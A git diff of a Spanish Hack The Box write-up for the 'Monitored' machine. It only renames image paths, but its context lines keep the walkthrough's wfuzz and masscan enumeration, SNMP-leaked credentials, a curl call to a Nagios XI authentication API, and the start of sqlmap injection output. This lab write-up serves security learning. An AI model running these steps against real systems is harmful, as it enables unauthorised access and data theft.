@@ -3,7 +3,7 @@ title: "Monitored - WriteUp"
 date: Sun Nov 03 2024 11:00:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, dirb, reverse-shell, linpeas, wfuzz, sqlmap, pspy, apache]
-image: /assets/img/htb-writeups/Pasted image 20240117151943.png
+image: /assets/img/htb-writeups/Pasted-image-20240117151943.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240117151943.png
   platform="HTB"
 %}
 
-![Monitored](/assets/img/htb-writeups/Pasted image 20240117151943.png)
+![Monitored](/assets/img/htb-writeups/Pasted-image-20240117151943.png)
 
 ------
 
@@ -68,9 +68,9 @@ https://nagios.monitored.htb/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HT
 
 HTTP
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117151943.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117151943.png)
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117152021.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117152021.png)
 
 FUZZING
 
@@ -78,17 +78,17 @@ FUZZING
 wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hh 3245 -t 100 'https://nagios.monitored.htb/FUZZ'
 ```
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117153357.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117153357.png)
 
 Si intentamos acceder a /nagios nos salta un panel de login
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117153508.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117153508.png)
 
 ```bash
 $ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hl 0 -t 100 'https://nagios.monitored.htb/nagiosxi/FUZZ'
 ```
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117154418.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117154418.png)
 
 Buscamos subdominios, pero tampoco encontramos nada, excepto API, pero al no tener credenciales poco podemos hacer. Vamos a probar puertos UDP con _masscan_:
 
@@ -96,7 +96,7 @@ Buscamos subdominios, pero tampoco encontramos nada, excepto API, pero al no ten
 sudo masscan -e tun0 -p1-65535,U:1-65535 --rate 500 10.129.224.224
 ```
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117163133.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117163133.png)
 
 Descubrimos el puerto 161 UDP correspondiente a SNMP. Vamos a intentar enumerar cosas por ahí...
 
@@ -122,7 +122,7 @@ iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
 
 Vamos a buscar tranquila mente en todo el log para ver si podemos encontrar algo que nos pueda servir para avanzar.
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117163646.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117163646.png)
 
 Encontramos lo que parecen ser unas credenciales, vamos a apuntarlas para probar contra los paneles de login que hemos encontrado:
 
@@ -132,7 +132,7 @@ svc:XjH7VCehowpR1xZB
 
 Nos vamos al url https://nagios.monitored.htb/nagios/ y entramos con estas credenciales.
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117163908.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117163908.png)
 
 ```bash
 $ curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
@@ -149,7 +149,7 @@ Crear nuevo usuario:
 
 SQLi
 
-![MONITORED](/assets/img/htb-writeups/Pasted image 20240117175925.png)
+![MONITORED](/assets/img/htb-writeups/Pasted-image-20240117175925.png)
 
 ```
 [17:58:51] [INFO] retrieved: 'Nagios Administrator'
